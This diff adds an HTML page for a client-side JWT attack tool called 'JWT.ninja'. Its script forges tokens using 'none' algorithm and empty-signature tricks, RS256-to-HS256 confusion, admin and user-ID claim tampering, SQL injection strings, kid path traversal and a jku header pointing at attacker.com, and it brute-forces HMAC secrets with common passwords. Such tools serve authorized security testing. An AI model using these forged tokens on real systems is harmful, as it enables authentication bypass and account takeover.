@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JWT.ninja - JWT Security Testing Tool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        header p {
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .input-section {
+            margin-bottom: 30px;
+        }
+
+        .input-section h2 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 1.5em;
+        }
+
+        textarea {
+            width: 100%;
+            min-height: 120px;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            resize: vertical;
+            transition: border-color 0.3s;
+        }
+
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .decoded-section {
+            margin-bottom: 30px;
+        }
+
+        .decoded-content {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 5px;
+            border-left: 4px solid #667eea;
+        }
+
+        .decoded-content h3 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+
+        .decoded-content pre {
+            background: white;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+
+        .results-section {
+            margin-bottom: 30px;
+        }
+
+        .results-section h2 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+        }
+
+        .result-item {
+            background: #f8f9fa;
+            padding: 20px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            border-left: 4px solid #28a745;
+        }
+
+        .result-item.warning {
+            border-left-color: #ffc107;
+        }
+
+        .result-item.danger {
+            border-left-color: #dc3545;
+        }
+
+        .result-item h3 {
+            color: #333;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .result-item .tag {
+            background: #667eea;
+            color: white;
+            padding: 3px 10px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: normal;
+        }
+
+        .result-item p {
+            color: #666;
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .jwt-display {
+            background: white;
+            padding: 15px;
+            border-radius: 5px;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            border: 1px solid #ddd;
+            margin-top: 10px;
+        }
+
+        .copy-btn {
+            background: #28a745;
+            padding: 5px 15px;
+            font-size: 14px;
+            margin-left: 10px;
+        }
+
+        .copy-btn:hover {
+            background: #218838;
+        }
+
+        .error {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+        }
+
+        .success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+        }
+
+        .loading {
+            display: inline-block;
+            margin-left: 10px;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        footer {
+            background: #f8f9fa;
+            padding: 20px;
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .info-box {
+            background: #e7f3ff;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+
+        .info-box p {
+            color: #014361;
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🥷 JWT.ninja</h1>
+            <p>JWT Security Testing Tool - Tamper, Test, and Crack JWTs</p>
+        </header>
+
+        <div class="content">
+            <div class="info-box">
+                <p><strong>⚠️ Security Warning:</strong> This tool is for authorized security testing only.</p>
+                <p>Use it responsibly to test your own applications or applications you have permission to test.</p>
+            </div>
+
+            <div class="input-section">
+                <h2>📝 Input JWT Token</h2>
+                <textarea id="jwtInput" placeholder="Paste your JWT token here (e.g., eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c)"></textarea>
+                <button onclick="analyzeJWT()">🔍 Analyze & Tamper JWT</button>
+            </div>
+
+            <div id="decodedSection" class="decoded-section" style="display: none;">
+                <h2>🔓 Decoded JWT</h2>
+                <div class="decoded-content">
+                    <h3>Header</h3>
+                    <pre id="headerDisplay"></pre>
+                    <h3>Payload</h3>
+                    <pre id="payloadDisplay"></pre>
+                    <h3>Signature</h3>
+                    <pre id="signatureDisplay"></pre>
+                </div>
+            </div>
+
+            <div id="resultsSection" class="results-section" style="display: none;">
+                <h2>🎯 Tampered JWTs</h2>
+                <div id="resultsContainer"></div>
+            </div>
+
+            <div id="bruteforceSection" class="results-section" style="display: none;">
+                <h2>🔑 HMAC Secret Brute Force</h2>
+                <div id="bruteforceContainer"></div>
+            </div>
+        </div>
+
+        <footer>
+            <p>JWT.ninja - Educational Security Tool</p>
+            <p>Always obtain proper authorization before testing</p>
+        </footer>
+    </div>
+
+    <script>
+        // Common weak passwords to try for HMAC brute forcing
+        const COMMON_PASSWORDS = [
+            'secret', 'password', '123456', '12345678', 'qwerty', 'abc123',
+            'monkey', '1234567', 'letmein', 'trustno1', 'dragon', 'baseball',
+            'iloveyou', 'master', 'sunshine', 'ashley', 'bailey', 'shadow',
+            'superman', 'qazwsx', 'michael', 'football', 'password1', '123456789',
+            'admin', 'root', 'toor', 'pass', 'test', 'guest', 'changeme',
+            'welcome', 'hello', 'password123', 'letmein', 'secret123', 'secretkey',
+            'key', 'mykey', 'mysecret', 'jwt', 'token', 'auth', 'yourkey',
+            '', 'null', 'none', 'undefined'
+        ];
+
+        // Base64URL decode
+        function base64UrlDecode(str) {
+            str = str.replace(/-/g, '+').replace(/_/g, '/');
+            while (str.length % 4) {
+                str += '=';
+            }
+            return decodeURIComponent(atob(str).split('').map(function(c) {
+                return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+            }).join(''));
+        }
+
+        // Base64URL encode
+        function base64UrlEncode(str) {
+            return btoa(str)
+                .replace(/\+/g, '-')
+                .replace(/\//g, '_')
+                .replace(/=/g, '');
+        }
+
+        // Parse JWT
+        function parseJWT(token) {
+            try {
+                const parts = token.trim().split('.');
+                if (parts.length !== 3) {
+                    throw new Error('Invalid JWT format');
+                }
+
+                const header = JSON.parse(base64UrlDecode(parts[0]));
+                const payload = JSON.parse(base64UrlDecode(parts[1]));
+                const signature = parts[2];
+
+                return { header, payload, signature, parts };
+            } catch (e) {
+                throw new Error('Failed to parse JWT: ' + e.message);
+            }
+        }
+
+        // Create tampered JWTs
+        function createTamperedJWTs(originalToken) {
+            const { header, payload, parts } = parseJWT(originalToken);
+            const tamperedTokens = [];
+
+            // 1. None algorithm attack
+            const noneHeader = { ...header, alg: 'none' };
+            const noneToken = base64UrlEncode(JSON.stringify(noneHeader)) + '.' + parts[1] + '.';
+            tamperedTokens.push({
+                name: 'None Algorithm Attack',
+                description: 'Changed algorithm to "none" and removed signature. This exploits systems that don\'t properly validate the algorithm.',
+                token: noneToken,
+                type: 'danger',
+                tag: 'CRITICAL'
+            });
+
+            // 2. None algorithm (uppercase) attack
+            const noneUpperHeader = { ...header, alg: 'None' };
+            const noneUpperToken = base64UrlEncode(JSON.stringify(noneUpperHeader)) + '.' + parts[1] + '.';
+            tamperedTokens.push({
+                name: 'None Algorithm (Case Variation)',
+                description: 'Changed algorithm to "None" (capitalized). Some parsers may be case-insensitive.',
+                token: noneUpperToken,
+                type: 'danger',
+                tag: 'CRITICAL'
+            });
+
+            // 3. Empty signature
+            const emptySignature = parts[0] + '.' + parts[1] + '.';
+            tamperedTokens.push({
+                name: 'Empty Signature',
+                description: 'Removed signature while keeping original algorithm. Tests if signature validation is actually enforced.',
+                token: emptySignature,
+                type: 'danger',
+                tag: 'HIGH'
+            });
+
+            // 4. Modified payload (admin privilege escalation)
+            const adminPayload = { ...payload };
+            if (!adminPayload.admin) {
+                adminPayload.admin = true;
+            }
+            if (adminPayload.role) {
+                adminPayload.role = 'admin';
+            } else {
+                adminPayload.admin = true;
+            }
+            const adminToken = parts[0] + '.' + base64UrlEncode(JSON.stringify(adminPayload)) + '.' + parts[2];
+            tamperedTokens.push({
+                name: 'Privilege Escalation (Unsigned)',
+                description: 'Modified payload to add admin privileges without re-signing. Original signature will be invalid.',
+                token: adminToken,
+                type: 'warning',
+                tag: 'HIGH'
+            });
+
+            // 5. RS256 to HS256 algorithm confusion
+            if (header.alg && header.alg.startsWith('RS')) {
+                const hsHeader = { ...header, alg: 'HS256' };
+                const hsToken = base64UrlEncode(JSON.stringify(hsHeader)) + '.' + parts[1] + '.' + parts[2];
+                tamperedTokens.push({
+                    name: 'Algorithm Confusion (RS256→HS256)',
+                    description: 'Changed algorithm from RSA to HMAC. If the server uses the public key as HMAC secret, this may work.',
+                    token: hsToken,
+                    type: 'danger',
+                    tag: 'CRITICAL'
+                });
+            }
+
+            // 6. Modified user ID
+            if (payload.sub || payload.user_id || payload.userId || payload.id) {
+                const modifiedPayload = { ...payload };
+                if (payload.sub) modifiedPayload.sub = '0';
+                if (payload.user_id) modifiedPayload.user_id = '0';
+                if (payload.userId) modifiedPayload.userId = '0';
+                if (payload.id) modifiedPayload.id = '0';
+                
+                const modifiedToken = parts[0] + '.' + base64UrlEncode(JSON.stringify(modifiedPayload)) + '.' + parts[2];
+                tamperedTokens.push({
+                    name: 'User ID Modification (Unsigned)',
+                    description: 'Changed user identifier to "0" or admin user without re-signing.',
+                    token: modifiedToken,
+                    type: 'warning',
+                    tag: 'MEDIUM'
+                });
+            }
+
+            // 7. Null signature
+            const nullSigToken = parts[0] + '.' + parts[1] + '.null';
+            tamperedTokens.push({
+                name: 'Null Signature',
+                description: 'Replaced signature with literal "null". Tests for improper null handling.',
+                token: nullSigToken,
+                type: 'warning',
+                tag: 'MEDIUM'
+            });
+
+            // 8. SQL Injection in payload
+            const sqlPayload = { ...payload };
+            if (payload.sub) {
+                sqlPayload.sub = "' OR '1'='1";
+            } else {
+                sqlPayload.username = "admin' --";
+            }
+            const sqlToken = parts[0] + '.' + base64UrlEncode(JSON.stringify(sqlPayload)) + '.' + parts[2];
+            tamperedTokens.push({
+                name: 'SQL Injection Payload',
+                description: 'Injected SQL payload into user fields. Tests if JWT claims are used in SQL queries without sanitization.',
+                token: sqlToken,
+                type: 'warning',
+                tag: 'MEDIUM'
+            });
+
+            // 9. Kid header injection
+            const kidHeader = { ...header, kid: '../../dev/null' };
+            const kidToken = base64UrlEncode(JSON.stringify(kidHeader)) + '.' + parts[1] + '.' + parts[2];
+            tamperedTokens.push({
+                name: 'Kid Header Injection',
+                description: 'Added/modified "kid" (Key ID) header with path traversal. May exploit insecure key loading.',
+                token: kidToken,
+                type: 'warning',
+                tag: 'HIGH'
+            });
+
+            // 10. JKU header injection
+            const jkuHeader = { ...header, jku: 'https://attacker.com/jwks.json' };
+            const jkuToken = base64UrlEncode(JSON.stringify(jkuHeader)) + '.' + parts[1] + '.' + parts[2];
+            tamperedTokens.push({
+                name: 'JKU Header Injection',
+                description: 'Added "jku" (JWK Set URL) header pointing to attacker-controlled server.',
+                token: jkuToken,
+                type: 'danger',
+                tag: 'CRITICAL'
+            });
+
+            return tamperedTokens;
+        }
+
+        // HMAC signing function
+        async function hmacSign(message, secret) {
+            const encoder = new TextEncoder();
+            const key = await crypto.subtle.importKey(
+                'raw',
+                encoder.encode(secret),
+                { name: 'HMAC', hash: 'SHA-256' },
+                false,
+                ['sign']
+            );
+            const signature = await crypto.subtle.sign('HMAC', key, encoder.encode(message));
+            return base64UrlEncode(String.fromCharCode(...new Uint8Array(signature)));
+        }
+
+        // Brute force HMAC secret
+        async function bruteForceHMAC(token) {
+            const parts = token.trim().split('.');
+            if (parts.length !== 3) return null;
+
+            const message = parts[0] + '.' + parts[1];
+            const originalSignature = parts[2];
+
+            const results = [];
+            
+            for (const password of COMMON_PASSWORDS) {
+                try {
+                    const signature = await hmacSign(message, password);
+                    if (signature === originalSignature) {
+                        results.push({
+                            found: true,
+                            secret: password,
+                            description: password === '' ? '(empty string)' : password
+                        });
+                        // Found it! But continue to check if there are collisions
+                    }
+                } catch (e) {
+                    // Continue to next password
+                }
+            }
+
+            return results.length > 0 ? results : null;
+        }
+
+        // Copy to clipboard
+        function copyToClipboard(text, buttonElement) {
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = buttonElement.textContent;
+                buttonElement.textContent = '✓ Copied!';
+                setTimeout(() => {
+                    buttonElement.textContent = originalText;
+                }, 2000);
+            });
+        }
+
+        // Main analysis function
+        async function analyzeJWT() {
+            const jwtInput = document.getElementById('jwtInput').value.trim();
+            
+            if (!jwtInput) {
+                alert('Please enter a JWT token');
+                return;
+            }
+
+            try {
+                // Parse and display decoded JWT
+                const { header, payload, signature } = parseJWT(jwtInput);
+                
+                document.getElementById('headerDisplay').textContent = JSON.stringify(header, null, 2);
+                document.getElementById('payloadDisplay').textContent = JSON.stringify(payload, null, 2);
+                document.getElementById('signatureDisplay').textContent = signature;
+                document.getElementById('decodedSection').style.display = 'block';
+
+                // Generate tampered tokens
+                const tamperedTokens = createTamperedJWTs(jwtInput);
+                const resultsContainer = document.getElementById('resultsContainer');
+                resultsContainer.innerHTML = '';
+
+                tamperedTokens.forEach((item, index) => {
+                    const resultDiv = document.createElement('div');
+                    resultDiv.className = `result-item ${item.type}`;
+                    resultDiv.innerHTML = `
+                        <h3>
+                            ${item.name}
+                            <span class="tag">${item.tag}</span>
+                        </h3>
+                        <p>${item.description}</p>
+                        <div class="jwt-display">${item.token}</div>
+                        <button class="copy-btn" onclick="copyToClipboard('${item.token.replace(/'/g, "\\'")}', this)">📋 Copy Token</button>
+                    `;
+                    resultsContainer.appendChild(resultDiv);
+                });
+
+                document.getElementById('resultsSection').style.display = 'block';
+
+                // Brute force HMAC if it's an HMAC algorithm
+                if (header.alg && (header.alg === 'HS256' || header.alg === 'HS384' || header.alg === 'HS512')) {
+                    document.getElementById('bruteforceSection').style.display = 'block';
+                    const bruteforceContainer = document.getElementById('bruteforceContainer');
+                    bruteforceContainer.innerHTML = '<div class="result-item"><p>🔄 Attempting to brute force HMAC secret with common passwords... <span class="spinner"></span></p></div>';
+
+                    setTimeout(async () => {
+                        const results = await bruteForceHMAC(jwtInput);
+                        
+                        if (results && results.length > 0) {
+                            bruteforceContainer.innerHTML = '';
+                            results.forEach(result => {
+                                const secretDisplay = result.secret === '' ? '(empty string)' : result.secret;
+                                const resultDiv = document.createElement('div');
+                                resultDiv.className = 'result-item danger';
+                                resultDiv.innerHTML = `
+                                    <h3>✅ Secret Found! <span class="tag">CRITICAL</span></h3>
+                                    <p><strong>The HMAC secret is:</strong> <code style="background: #fff3cd; padding: 5px 10px; border-radius: 3px; font-size: 16px;">${secretDisplay}</code></p>
+                                    <p>This is a critical vulnerability! The JWT is signed with a weak, common password. An attacker can create valid tokens.</p>
+                                `;
+                                bruteforceContainer.appendChild(resultDiv);
+                            });
+                        } else {
+                            bruteforceContainer.innerHTML = `
+                                <div class="result-item">
+                                    <h3>❌ Secret Not Found</h3>
+                                    <p>Could not crack the HMAC secret with common passwords. This is good! The secret appears to be strong.</p>
+                                    <p>Tested ${COMMON_PASSWORDS.length} common passwords.</p>
+                                </div>
+                            `;
+                        }
+                    }, 100);
+                } else {
+                    document.getElementById('bruteforceSection').style.display = 'none';
+                }
+
+            } catch (e) {
+                alert('Error: ' + e.message);
+            }
+        }
+
+        // Allow Enter key to trigger analysis
+        document.getElementById('jwtInput').addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'Enter') {
+                analyzeJWT();
+            }
+        });
+    </script>
+</body>
+</html>
